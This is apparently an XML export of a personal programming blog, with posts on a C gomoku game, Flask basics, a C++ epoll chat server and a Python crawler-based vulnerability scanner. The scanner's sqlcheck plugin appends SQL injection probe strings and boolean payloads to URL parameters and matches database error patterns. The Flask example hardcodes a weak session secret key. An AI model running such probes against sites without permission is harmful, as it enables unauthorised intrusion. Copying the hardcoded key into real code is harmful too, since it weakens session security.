    <content type="text"><![CDATA[Code:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146//&#x68CB;&#x5B50; &#x25CF; &#x25CB;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define N 15int chessboard[N + 1][N + 1] = { 0 };//&#x7528;&#x6765;&#x8BB0;&#x5F55;&#x8F6E;&#x5230;&#x73A9;&#x5BB6;1&#x8FD8;&#x662F;&#x73A9;&#x5BB6;2int whoseTurn = 0;void initGame(void);void printChessboard(void);void playChess(void);int judge(int, int);int main(void){ //&#x521D;&#x59CB;&#x5316;&#x6E38;&#x620F; initGame(); while (1) { //&#x6BCF;&#x6B21;&#x5FAA;&#x73AF;&#x81EA;&#x589E;1&#xFF0C;&#x5B9E;&#x73B0;&#x73A9;&#x5BB6;&#x8F6E;&#x6D41;&#x4E0B;&#x5B50; whoseTurn++; playChess(); } return 0;}void initGame(void){ char c; printf(&quot;input Y to enter the game:&quot;); c = getchar(); if (&apos;y&apos; != c &amp;&amp; &apos;Y&apos; != c) exit(0); system(&quot;clear&quot;); printChessboard();}void printChessboard(void){ int i, j; for (i = 0; i &lt;= N; i++) { for (j = 0; j &lt;= N; j++) { if (0 == i) printf(&quot;%3d&quot;, j); else if (j == 0) printf(&quot;%3d&quot;, i); else if (1 == chessboard[i][j]) printf(&quot; X&quot;); else if (2 == chessboard[i][j]) printf(&quot; O&quot;); else printf(&quot; *&quot;); } printf(&quot;\n&quot;); }}void playChess(void){ int i, j, winner; if (1 == whoseTurn % 2) { printf(&quot;Turn to player 1, please input the position:&quot;); scanf(&quot;%d %d&quot;, &amp;i, &amp;j); //&#x5982;&#x679C;&#x8F93;&#x5165;&#x7684;&#x4F4D;&#x7F6E;&#x8D85;&#x51FA;&#x68CB;&#x76D8;&#x7684;&#x8303;&#x56F4;&#xFF0C;&#x5219;&#x91CD;&#x65B0;&#x8F93;&#x5165;&#x3002; if (i &gt; N+1 || j &gt; N+1) { printf(&quot;your position beynod the chessboard range, please input the proper position:&quot;); scanf(&quot;%d %d&quot;, &amp;i, &amp;j); } while(chessboard[i][j] != 0) { printf(&quot;your position is taken,choose another:&quot;); scanf(&quot;%d %d&quot;, &amp;i, &amp;j); } chessboard[i][j] = 1; } else { printf(&quot;Turn to player 2, please input the position:&quot;); scanf(&quot;%d %d&quot;, &amp;i, &amp;j); //&#x5982;&#x679C;&#x8F93;&#x5165;&#x7684;&#x4F4D;&#x7F6E;&#x8D85;&#x51FA;&#x68CB;&#x76D8;&#x7684;&#x8303;&#x56F4;&#xFF0C;&#x5219;&#x91CD;&#x65B0;&#x8F93;&#x5165;&#x3002; if (i &gt; N+1 || j &gt; N+1) { printf(&quot;your position beynod the chessboard range, please input the proper position:&quot;); scanf(&quot;%d %d&quot;, &amp;i, &amp;j); } while(chessboard[i][j] != 0) { printf(&quot;your position is taken,choose another:&quot;); scanf(&quot;%d %d&quot;, &amp;i, &amp;j); } chessboard[i][j] = 2; } system(&quot;clear&quot;); printChessboard(); if (judge(i, j)) { if (1 == whoseTurn % 2) { printf(&quot;player1 win!\n&quot;); exit(0); } else { printf(&quot;player2 win!\n&quot;); exit(0); } }}int judge(int x, int y){ int i, j; int t = 2 - whoseTurn % 2; const int step[4][2]={{-1,0},{0,-1},{1,1},{-1,1}}; // BUG for(int i=0;i&lt;4;++i) { const int d[2]={-1,1}; int count=1; for(int j=0;j&lt;2;++j) for(int k=1;k&lt;=4;++k){ // suppose x = 5, y = 5 int row=x+k*d[j]*step[i][0]; // row: int col=y+k*d[j]*step[i][1]; // col: if(row&gt;=1&amp;&amp;row&lt;=N&amp;&amp;col&gt;=1&amp;&amp;col&lt;=N&amp;&amp;chessboard[x][y]==chessboard[row][col]) count+=1; else break; } if(count&gt;=5) return 1; } return 0;} &#x8FD0;&#x884C;&#x7ED3;&#x679C;&#xFF1A; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>c</category>
        <category>game</category>
      </categories>
      <tags>
        <tag>game</tag>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python3 builds a personal blog based on the Flask framework]]></title>
    <url>%2F2018%2F10%2F06%2FPython3-builds-a-personal-blog-based-on-the-Flask-framework%2F</url>
    <content type="text"><![CDATA[&#x5B8C;&#x6574;&#x4EE3;&#x7801; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>python</category>
        <category>flask</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>flask</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python Flask web framework]]></title>
    <url>%2F2018%2F10%2F05%2FPython-Flask-web-framework%2F</url>
    <content type="text"><![CDATA[&#x8DEF;&#x7531;123456789@app.route(&apos;/user/&lt;username&gt;&apos;)def show_user_profile(username): # &#x663E;&#x793A;&#x7528;&#x6237;&#x7684;&#x540D;&#x79F0; return &apos;User %s&apos; % username@app.route(&apos;/post/&lt;int:post_id&gt;&apos;)def show_post(post_id): # &#x663E;&#x793A;&#x63D0;&#x4EA4;&#x6574;&#x578B;&#x7684;&#x7528;&#x6237;&quot;id&quot;&#x7684;&#x7ED3;&#x679C;&#xFF0C;&#x6CE8;&#x610F;&quot;int&quot;&#x662F;&#x5C06;&#x8F93;&#x5165;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x5F62;&#x5F0F;&#x8F6C;&#x6362;&#x4E3A;&#x6574;&#x578B;&#x6570;&#x636E; return &apos;Post %d&apos; % post_id &#x9759;&#x6001;&#x6587;&#x4EF6;&#x53CA;&#x6E32;&#x67D3;&#x6A21;&#x7248;hello.py123456from flask import render_template@app.route(&apos;/hello/&apos;)@app.route(&apos;/hello/&lt;name&gt;&apos;)def hello(name=None): return render_template(&apos;hello.html&apos;, name=name) hello.html1234567&lt;!doctype html&gt;&lt;title&gt;Hello from Flask&lt;/title&gt;{% if name %} &lt;h1&gt;Hello {{ name }}!&lt;/h1&gt;{% else %} &lt;h1&gt;Hello World!&lt;/h1&gt;{% endif %} &#x91CD;&#x5B9A;&#x5411;12345678910from flask import abort, redirect, url_for@app.route(&apos;/&apos;)def index(): return redirect(url_for(&apos;login&apos;))@app.route(&apos;/login&apos;)def login(): abort(401) this_is_never_executed() &#x5B9A;&#x5236;&#x9519;&#x8BEF;&#x9875;&#x9762;&#xFF1A;12345from flask import render_template@app.errorhandler(404)def page_not_found(error): return render_template(&apos;page_not_found.html&apos;), 404 &#x56DE;&#x8BDD;&#xFF1A;123456789101112131415161718192021222324252627282930from flask import Flask, session, redirect, url_for, escape, requestapp = Flask(__name__)@app.route(&apos;/&apos;)def index(): if &apos;username&apos; in session: return &apos;Logged in as %s&apos; % escape(session[&apos;username&apos;]) return &apos;You are not logged in&apos;@app.route(&apos;/login&apos;, methods=[&apos;GET&apos;, &apos;POST&apos;])def login(): if request.method == &apos;POST&apos;: session[&apos;username&apos;] = request.form[&apos;username&apos;] return redirect(url_for(&apos;index&apos;)) return &apos;&apos;&apos; &lt;form action=&quot;&quot; method=&quot;post&quot;&gt; &lt;p&gt;&lt;input type=text name=username&gt; &lt;p&gt;&lt;input type=submit value=Login&gt; &lt;/form&gt; &apos;&apos;&apos;@app.route(&apos;/logout&apos;)def logout(): # &#x5982;&#x679C;&#x7528;&#x6237;&#x540D;&#x5B58;&#x5728;&#xFF0C;&#x5219;&#x4ECE;&#x4F1A;&#x8BDD;&#x4E2D;&#x79FB;&#x9664;&#x8BE5;&#x7528;&#x6237;&#x540D; session.pop(&apos;username&apos;, None) return redirect(url_for(&apos;index&apos;))# &#x8BBE;&#x7F6E;&#x5BC6;&#x94A5;&#xFF0C;&#x4FDD;&#x8BC1;&#x4F1A;&#x8BDD;&#x5B89;&#x5168;app.secret_key = &apos;wing1995 is a very good girl&apos; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>python</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python builds vulnerability scanner]]></title>
    <url>%2F2018%2F10%2F05%2FPython-builds-vulnerability-scanner%2F</url>
    <content type="text"><![CDATA[&#x4E3B;&#x8981;&#x6587;&#x4EF6;&#x76EE;&#x5F55;&#xFF1A;|&#x2013;lib&#x2014;-|&#x2014;core&#x2014;&#x2013;|&#x2014;Download.py| | |&#x2014;plugin.py| | |&#x2014;Spider.py| | |&#x2014;UrlManager.py| || |&#x2014;init.py|||&#x2013;script&#x2014;-|&#x2014;email_check.py| || |&#x2014;sqlcheck.py|&#x2013;w8ay.py (&#x8FD9;&#x91CC;&#x53EA;&#x7ED9;&#x51FA;&#x4E86;&#x5173;&#x952E;&#x7684;&#x7684;&#x4EE3;&#x7801;) w8ay.py12345678910111213141516171819#!/usr/bin/env python#-*- coding:utf-8 -*-&apos;&apos;&apos;Name:w8ayScanAuthor:w8ayCopyright (c) 2017&apos;&apos;&apos;import sysfrom lib.core.Spider import SpiderMaindef main(): root = &quot;https://www.shiyanlou.com/&quot; threadNum = 10 #spider w8 = SpiderMain(root,threadNum) w8.craw()if __name__ == &apos;__main__&apos;: main() email_check.py123456789101112#!/usr/bin/env python# __author__= &apos;w8ay&apos;import reclass spider(): def run(self,url,html): #print(html) pattern = re.compile(r&apos;([\w-]+@[\w-]+\.[\w-]+)+&apos;) email_list = re.findall(pattern, html) if(email_list): print(email_list) return True return False sqlcheck.py123456789101112131415161718192021222324252627282930313233343536import re,randomfrom lib.core import Downloadclass spider: def run(self,url,html): if(not url.find(&quot;?&quot;)): return False Downloader = Download.Downloader() BOOLEAN_TESTS = (&quot; AND %d=%d&quot;, &quot; OR NOT (%d=%d)&quot;) DBMS_ERRORS = {# regular expressions used for DBMS recognition based on error message response &quot;MySQL&quot;: (r&quot;SQL syntax.*MySQL&quot;, r&quot;Warning.*mysql_.*&quot;, r&quot;valid MySQL result&quot;, r&quot;MySqlClient\.&quot;), &quot;PostgreSQL&quot;: (r&quot;PostgreSQL.*ERROR&quot;, r&quot;Warning.*\Wpg_.*&quot;, r&quot;valid PostgreSQL result&quot;, r&quot;Npgsql\.&quot;), &quot;Microsoft SQL Server&quot;: (r&quot;Driver.* SQL[\-\_\ ]*Server&quot;, r&quot;OLE DB.* SQL Server&quot;, r&quot;(\W|\A)SQL Server.*Driver&quot;, r&quot;Warning.*mssql_.*&quot;, r&quot;(\W|\A)SQL Server.*[0-9a-fA-F]{8}&quot;, r&quot;(?s)Exception.*\WSystem\.Data\.SqlClient\.&quot;, r&quot;(?s)Exception.*\WRoadhouse\.Cms\.&quot;), &quot;Microsoft Access&quot;: (r&quot;Microsoft Access Driver&quot;, r&quot;JET Database Engine&quot;, r&quot;Access Database Engine&quot;), &quot;Oracle&quot;: (r&quot;\bORA-[0-9][0-9][0-9][0-9]&quot;, r&quot;Oracle error&quot;, r&quot;Oracle.*Driver&quot;, r&quot;Warning.*\Woci_.*&quot;, r&quot;Warning.*\Wora_.*&quot;), &quot;IBM DB2&quot;: (r&quot;CLI Driver.*DB2&quot;, r&quot;DB2 SQL error&quot;, r&quot;\bdb2_\w+\(&quot;), &quot;SQLite&quot;: (r&quot;SQLite/JDBCDriver&quot;, r&quot;SQLite.Exception&quot;, r&quot;System.Data.SQLite.SQLiteException&quot;, r&quot;Warning.*sqlite_.*&quot;, r&quot;Warning.*SQLite3::&quot;, r&quot;\[SQLITE_ERROR\]&quot;), &quot;Sybase&quot;: (r&quot;(?i)Warning.*sybase.*&quot;, r&quot;Sybase message&quot;, r&quot;Sybase.*Server message.*&quot;), } _url = url + &quot;%29%28%22%27&quot; _content = Downloader.get(_url) for (dbms, regex) in ((dbms, regex) for dbms in DBMS_ERRORS for regex in DBMS_ERRORS[dbms]): if(re.search(regex,_content)): print &quot;sql fonud: %&quot;%url return True content = {} content[&quot;origin&quot;] = Downloader.get(_url) for test_payload in BOOLEAN_TESTS: RANDINT = random.randint(1, 255) _url = url + test_payload%(RANDINT,RANDINT) content[&quot;true&quot;] = Downloader.get(_url) _url = url + test_payload%(RANDINT,RANDINT+1) content[&quot;false&quot;] = Downloader.get(_url) if content[&quot;origin&quot;]==content[&quot;true&quot;]!=content[&quot;false&quot;]: print &quot;sql fonud: %&quot;%url return True Download.py12345678910111213141516171819202122232425262728293031#!/usr/bin/env python#-*- coding:utf-8 -*-import requestsclass Downloader(object): def get(self,url): r = requests.get(url,timeout=10) if r.status_code != 200: return None _str = r.text return _str def post(self,url,data): r = requests.post(url,data) _str = r.text return _str def download(self, url,htmls): if url is None: return None _str = {} _str[&quot;url&quot;] = url try: r = requests.get(url, timeout=10) if r.status_code != 200: return None _str[&quot;html&quot;] = r.text except Exception as e: return None htmls.append(_str) Plugin.py1234567891011121314151617181920212223242526272829303132#!/usr/bin/env python# __author__= &apos;w8ay&apos;import osimport sysclass spiderplus(object): def __init__(self,plugin,disallow=[]): self.dir_exploit = [] self.disallow = [&apos;__init__&apos;] self.disallow.extend(disallow) self.plugin = os.getcwd()+&apos;/&apos; +plugin sys.path.append(plugin) def list_plusg(self): def filter_func(file): if not file.endswith(&quot;.py&quot;): return False for disfile in self.disallow: if disfile in file: return False return True dir_exploit = filter(filter_func, os.listdir(self.plugin)) return list(dir_exploit) def work(self,url,html): for _plugin in self.list_plusg(): try: m = __import__(_plugin.split(&apos;.&apos;)[0]) spider = getattr(m, &apos;spider&apos;) p = spider() s =p.run(url,html) except Exception,e: print e Spider.py12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#!/usr/bin/env python#-*- coding:utf-8 -*-from lib.core import Download,UrlManager,pluginimport threadingfrom urlparse import urljoinfrom bs4 import BeautifulSoupfrom script import sqlcheckimport sysclass SpiderMain(object): def __init__(self,root,threadNum): self.urls = UrlManager.UrlManager() self.download = Download.Downloader() self.root = root self.threadNum = threadNum def _judge(self, domain, url): if (url.find(domain) != -1): return True else: return False def _parse(self,page_url,content): if content is None: return soup = BeautifulSoup(content, &apos;html.parser&apos;) _news = self._get_new_urls(page_url,soup) return _news def _get_new_urls(self, page_url,soup): new_urls = set() links = soup.find_all(&apos;a&apos;) for link in links: new_url = link.get(&apos;href&apos;) new_full_url = urljoin(page_url, new_url) if(self._judge(self.root,new_full_url)): new_urls.add(new_full_url) return new_urls def craw(self): self.urls.add_new_url(self.root) while self.urls.has_new_url(): _content = [] th = [] for i in list(range(self.threadNum)): if self.urls.has_new_url() is False: break new_url = self.urls.get_new_url() ##sql check # try: # if(sqlcheck.sqlcheck(new_url)): # print(&quot;url:%s sqlcheck is valueable&quot;%new_url) # except: # pass print(&quot;craw:&quot; + new_url) t = threading.Thread(target=self.download.download,args=(new_url,_content)) t.start() th.append(t) for t in th: t.join() for _str in _content: if _str is None: continue new_urls = self._parse(new_url,_str[&quot;html&quot;]) disallow = [&quot;sqlcheck&quot;] _plugin = plugin.spiderplus(&quot;script&quot;,disallow) _plugin.work(_str[&quot;url&quot;],_str[&quot;html&quot;]) self.urls.add_new_urls(new_urls) UrlManger.py123456789101112131415161718192021222324252627#!/usr/bin/env python#-*- coding:utf-8 -*-class UrlManager(object): def __init__(self): self.new_urls = set() self.old_urls = set() def add_new_url(self, url): if url is None: return if url not in self.new_urls and url not in self.old_urls: self.new_urls.add(url) def add_new_urls(self, urls): if urls is None or len(urls) == 0: return for url in urls: self.add_new_url(url) def has_new_url(self): return len(self.new_urls) != 0 def get_new_url(self): new_url = self.new_urls.pop() self.old_urls.add(new_url) return new_url document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>python</category>
        <category>security</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>security</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C++ implements instant messaging software]]></title>
    <url>%2F2018%2F10%2F04%2FC-implements-instant-messaging-software%2F</url>
    <content type="text"><![CDATA[&#x4E3B;&#x8981;&#x4EE3;&#x7801;&#xFF1A; common.h:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#ifndef CHATROOM_COMMON_H#define CHATROOM_COMMON_H#include &lt;iostream&gt;#include &lt;list&gt;#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;#include &lt;netinet/in.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;sys/epoll.h&gt;#include &lt;fcntl.h&gt;#include &lt;errno.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;// &#x9ED8;&#x8BA4;&#x670D;&#x52A1;&#x5668;&#x7AEF;IP&#x5730;&#x5740;#define SERVER_IP &quot;127.0.0.1&quot;// &#x670D;&#x52A1;&#x5668;&#x7AEF;&#x53E3;&#x53F7;#define SERVER_PORT 8888// int epoll_create(int size)&#x4E2D;&#x7684;size// &#x4E3A;epoll&#x652F;&#x6301;&#x7684;&#x6700;&#x5927;&#x53E5;&#x67C4;&#x6570;#define EPOLL_SIZE 5000// &#x7F13;&#x51B2;&#x533A;&#x5927;&#x5C0F;65535#define BUF_SIZE 0xFFFF // &#x65B0;&#x7528;&#x6237;&#x767B;&#x5F55;&#x540E;&#x7684;&#x6B22;&#x8FCE;&#x4FE1;&#x606F;#define SERVER_WELCOME &quot;Welcome you join to the chat room! Your chat ID is: Client #%d&quot;// &#x5176;&#x4ED6;&#x7528;&#x6237;&#x6536;&#x5230;&#x6D88;&#x606F;&#x7684;&#x524D;&#x7F00;#define SERVER_MESSAGE &quot;ClientID %d say &gt;&gt; %s&quot;// &#x9000;&#x51FA;&#x7CFB;&#x7EDF;#define EXIT &quot;EXIT&quot;// &#x63D0;&#x9192;&#x4F60;&#x662F;&#x804A;&#x5929;&#x5BA4;&#x4E2D;&#x552F;&#x4E00;&#x7684;&#x5BA2;&#x6237;#define CAUTION &quot;There is only one int the char room!&quot;// &#x6CE8;&#x518C;&#x65B0;&#x7684;fd&#x5230;epollfd&#x4E2D;// &#x53C2;&#x6570;enable_et&#x8868;&#x793A;&#x662F;&#x5426;&#x542F;&#x7528;ET&#x6A21;&#x5F0F;&#xFF0C;&#x5982;&#x679C;&#x4E3A;True&#x5219;&#x542F;&#x7528;&#xFF0C;&#x5426;&#x5219;&#x4F7F;&#x7528;LT&#x6A21;&#x5F0F;static void addfd( int epollfd, int fd, bool enable_et ){ struct epoll_event ev; ev.data.fd = fd; ev.events = EPOLLIN; if( enable_et ) ev.events = EPOLLIN | EPOLLET; epoll_ctl(epollfd, EPOLL_CTL_ADD, fd, &amp;ev); // &#x8BBE;&#x7F6E;socket&#x4E3A;nonblocking&#x6A21;&#x5F0F; // &#x6267;&#x884C;&#x5B8C;&#x5C31;&#x8F6C;&#x5411;&#x4E0B;&#x4E00;&#x6761;&#x6307;&#x4EE4;&#xFF0C;&#x4E0D;&#x7BA1;&#x51FD;&#x6570;&#x6709;&#x6CA1;&#x6709;&#x8FD4;&#x56DE;&#x3002; fcntl(fd, F_SETFL, fcntl(fd, F_GETFD, 0)| O_NONBLOCK); printf(&quot;fd added to epoll!\n\n&quot;);}#endif // CHATROOM_COMMON_H server.cpp:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193#include &lt;iostream&gt;#include &quot;Server.h&quot;using namespace std;// &#x670D;&#x52A1;&#x7AEF;&#x7C7B;&#x6210;&#x5458;&#x51FD;&#x6570;// &#x670D;&#x52A1;&#x7AEF;&#x7C7B;&#x6784;&#x9020;&#x51FD;&#x6570;Server::Server(){ // &#x521D;&#x59CB;&#x5316;&#x670D;&#x52A1;&#x5668;&#x5730;&#x5740;&#x548C;&#x7AEF;&#x53E3; serverAddr.sin_family = PF_INET; serverAddr.sin_port = htons(SERVER_PORT); serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP); // &#x521D;&#x59CB;&#x5316;socket listener = 0; // epool fd epfd = 0;}// &#x521D;&#x59CB;&#x5316;&#x670D;&#x52A1;&#x7AEF;&#x5E76;&#x542F;&#x52A8;&#x76D1;&#x542C;void Server::Init() { cout &lt;&lt; &quot;Init Server...&quot; &lt;&lt; endl; //&#x521B;&#x5EFA;&#x76D1;&#x542C;socket listener = socket(PF_INET, SOCK_STREAM, 0); if(listener &lt; 0) { perror(&quot;listener&quot;); exit(-1);} //&#x7ED1;&#x5B9A;&#x5730;&#x5740; if( bind(listener, (struct sockaddr *)&amp;serverAddr, sizeof(serverAddr)) &lt; 0) { perror(&quot;bind error&quot;); exit(-1); } //&#x76D1;&#x542C; int ret = listen(listener, 5); if(ret &lt; 0) { perror(&quot;listen error&quot;); exit(-1); } cout &lt;&lt; &quot;Start to listen: &quot; &lt;&lt; SERVER_IP &lt;&lt; endl; //&#x5728;&#x5185;&#x6838;&#x4E2D;&#x521B;&#x5EFA;&#x4E8B;&#x4EF6;&#x8868; epfd = epoll_create(EPOLL_SIZE); if(epfd &lt; 0) { perror(&quot;epfd error&quot;); exit(-1); } //&#x5F80;&#x4E8B;&#x4EF6;&#x8868;&#x91CC;&#x6DFB;&#x52A0;&#x76D1;&#x542C;&#x4E8B;&#x4EF6; addfd(epfd, listener, true);}// &#x5173;&#x95ED;&#x670D;&#x52A1;&#xFF0C;&#x6E05;&#x7406;&#x5E76;&#x5173;&#x95ED;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;void Server::Close() { //&#x5173;&#x95ED;socket close(listener); //&#x5173;&#x95ED;epoll&#x76D1;&#x542C; close(epfd);}// &#x53D1;&#x9001;&#x5E7F;&#x64AD;&#x6D88;&#x606F;&#x7ED9;&#x6240;&#x6709;&#x5BA2;&#x6237;&#x7AEF;int Server::SendBroadcastMessage(int clientfd){ // buf[BUF_SIZE] &#x63A5;&#x6536;&#x65B0;&#x6D88;&#x606F; // message[BUF_SIZE] &#x4FDD;&#x5B58;&#x683C;&#x5F0F;&#x5316;&#x7684;&#x6D88;&#x606F; char buf[BUF_SIZE], message[BUF_SIZE]; bzero(buf, BUF_SIZE); bzero(message, BUF_SIZE); // &#x63A5;&#x6536;&#x65B0;&#x6D88;&#x606F; cout &lt;&lt; &quot;read from client(clientID = &quot; &lt;&lt; clientfd &lt;&lt; &quot;)&quot; &lt;&lt; endl; int len = recv(clientfd, buf, BUF_SIZE, 0); // &#x5982;&#x679C;&#x5BA2;&#x6237;&#x7AEF;&#x5173;&#x95ED;&#x4E86;&#x8FDE;&#x63A5; if(len == 0) { close(clientfd); // &#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x5217;&#x8868;&#x4E2D;&#x5220;&#x9664;&#x8BE5;&#x5BA2;&#x6237;&#x7AEF; clients_list.remove(clientfd); cout &lt;&lt; &quot;ClientID = &quot; &lt;&lt; clientfd &lt;&lt; &quot; closed.\n now there are &quot; &lt;&lt; clients_list.size() &lt;&lt; &quot; client in the char room&quot; &lt;&lt; endl; } // &#x53D1;&#x9001;&#x5E7F;&#x64AD;&#x6D88;&#x606F;&#x7ED9;&#x6240;&#x6709;&#x5BA2;&#x6237;&#x7AEF; else { // &#x5224;&#x65AD;&#x662F;&#x5426;&#x804A;&#x5929;&#x5BA4;&#x8FD8;&#x6709;&#x5176;&#x4ED6;&#x5BA2;&#x6237;&#x7AEF; if(clients_list.size() == 1) { // &#x53D1;&#x9001;&#x63D0;&#x793A;&#x6D88;&#x606F; send(clientfd, CAUTION, strlen(CAUTION), 0); return len; } // &#x683C;&#x5F0F;&#x5316;&#x53D1;&#x9001;&#x7684;&#x6D88;&#x606F;&#x5185;&#x5BB9; sprintf(message, SERVER_MESSAGE, clientfd, buf); // &#x904D;&#x5386;&#x5BA2;&#x6237;&#x7AEF;&#x5217;&#x8868;&#x4F9D;&#x6B21;&#x53D1;&#x9001;&#x6D88;&#x606F;&#xFF0C;&#x9700;&#x8981;&#x5224;&#x65AD;&#x4E0D;&#x8981;&#x7ED9;&#x6765;&#x6E90;&#x5BA2;&#x6237;&#x7AEF;&#x53D1; list&lt;int&gt;::iterator it; for(it = clients_list.begin(); it != clients_list.end(); ++it) { if(*it != clientfd){ if( send(*it, message, BUF_SIZE, 0) &lt; 0 ) { return -1; } } } } return len;}// &#x542F;&#x52A8;&#x670D;&#x52A1;&#x7AEF;void Server::Start() { // epoll &#x4E8B;&#x4EF6;&#x961F;&#x5217; static struct epoll_event events[EPOLL_SIZE]; // &#x521D;&#x59CB;&#x5316;&#x670D;&#x52A1;&#x7AEF; Init(); //&#x4E3B;&#x5FAA;&#x73AF; while(1) { //epoll_events_count&#x8868;&#x793A;&#x5C31;&#x7EEA;&#x4E8B;&#x4EF6;&#x7684;&#x6570;&#x76EE; int epoll_events_count = epoll_wait(epfd, events, EPOLL_SIZE, -1); if(epoll_events_count &lt; 0) { perror(&quot;epoll failure&quot;); break; } cout &lt;&lt; &quot;epoll_events_count =\n&quot; &lt;&lt; epoll_events_count &lt;&lt; endl; //&#x5904;&#x7406;&#x8FD9;epoll_events_count&#x4E2A;&#x5C31;&#x7EEA;&#x4E8B;&#x4EF6; for(int i = 0; i &lt; epoll_events_count; ++i) { int sockfd = events[i].data.fd; //&#x65B0;&#x7528;&#x6237;&#x8FDE;&#x63A5; if(sockfd == listener) { struct sockaddr_in client_address; socklen_t client_addrLength = sizeof(struct sockaddr_in); int clientfd = accept( listener, ( struct sockaddr* )&amp;client_address, &amp;client_addrLength ); cout &lt;&lt; &quot;client connection from: &quot; &lt;&lt; inet_ntoa(client_address.sin_addr) &lt;&lt; &quot;:&quot; &lt;&lt; ntohs(client_address.sin_port) &lt;&lt; &quot;, clientfd = &quot; &lt;&lt; clientfd &lt;&lt; endl; addfd(epfd, clientfd, true); // &#x670D;&#x52A1;&#x7AEF;&#x7528;list&#x4FDD;&#x5B58;&#x7528;&#x6237;&#x8FDE;&#x63A5; clients_list.push_back(clientfd); cout &lt;&lt; &quot;Add new clientfd = &quot; &lt;&lt; clientfd &lt;&lt; &quot; to epoll&quot; &lt;&lt; endl; cout &lt;&lt; &quot;Now there are &quot; &lt;&lt; clients_list.size() &lt;&lt; &quot; clients int the chat room&quot; &lt;&lt; endl; // &#x670D;&#x52A1;&#x7AEF;&#x53D1;&#x9001;&#x6B22;&#x8FCE;&#x4FE1;&#x606F; cout &lt;&lt; &quot;welcome message&quot; &lt;&lt; endl; char message[BUF_SIZE]; bzero(message, BUF_SIZE); sprintf(message, SERVER_WELCOME, clientfd); int ret = send(clientfd, message, BUF_SIZE, 0); if(ret &lt; 0) { perror(&quot;send error&quot;); Close(); exit(-1); } } //&#x5904;&#x7406;&#x7528;&#x6237;&#x53D1;&#x6765;&#x7684;&#x6D88;&#x606F;&#xFF0C;&#x5E76;&#x5E7F;&#x64AD;&#xFF0C;&#x4F7F;&#x5176;&#x4ED6;&#x7528;&#x6237;&#x6536;&#x5230;&#x4FE1;&#x606F; else { int ret = SendBroadcastMessage(sockfd); if(ret &lt; 0) { perror(&quot;error&quot;); Close(); exit(-1); } } } } // &#x5173;&#x95ED;&#x670D;&#x52A1; Close();} server.h123456789101112131415161718192021222324252627282930313233343536373839404142434445#ifndef CHATROOM_SERVER_H#define CHATROOM_SERVER_H#include &lt;string&gt;#include &quot;Common.h&quot;using namespace std;// &#x670D;&#x52A1;&#x7AEF;&#x7C7B;&#xFF0C;&#x7528;&#x6765;&#x5904;&#x7406;&#x5BA2;&#x6237;&#x7AEF;&#x8BF7;&#x6C42;class Server {public: // &#x65E0;&#x53C2;&#x6570;&#x6784;&#x9020;&#x51FD;&#x6570; Server(); // &#x521D;&#x59CB;&#x5316;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x8BBE;&#x7F6E; void Init(); // &#x5173;&#x95ED;&#x670D;&#x52A1; void Close(); // &#x542F;&#x52A8;&#x670D;&#x52A1;&#x7AEF; void Start();private: // &#x5E7F;&#x64AD;&#x6D88;&#x606F;&#x7ED9;&#x6240;&#x6709;&#x5BA2;&#x6237;&#x7AEF; int SendBroadcastMessage(int clientfd); // &#x670D;&#x52A1;&#x5668;&#x7AEF;serverAddr&#x4FE1;&#x606F; struct sockaddr_in serverAddr; //&#x521B;&#x5EFA;&#x76D1;&#x542C;&#x7684;socket int listener; // epoll_create&#x521B;&#x5EFA;&#x540E;&#x7684;&#x8FD4;&#x56DE;&#x503C; int epfd; // 